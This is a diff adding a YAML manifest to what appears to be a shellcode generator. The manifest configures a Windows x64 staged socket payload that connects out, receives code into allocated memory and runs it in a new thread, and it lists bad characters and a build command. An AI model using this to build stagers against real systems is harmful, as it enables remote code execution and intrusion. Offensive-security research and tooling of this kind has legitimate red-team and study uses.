@@ -1,0 +1,14 @@
+# Staged socket execution - x64
+# IR workflow: WSAStartup -> WSASocketA -> connect -> VirtualAlloc ->
+#   recv -> CreateThread -> WaitForSingleObject
+#
+# Build:
+#   uv run python -c "from emitrion.build_x64 import build_x64; r = build_x64('emitrion/manifests/win-x64/staged_socket_x64.yaml', assemble=False); print(r.asm[:200])"
+arch: x64
+template: ir_staged_socket
+badchars: ["00", "0A", "0D"]
+
+strings:
+  - label: ws2_dll
+    value: ws2_32.dll
+    method: push
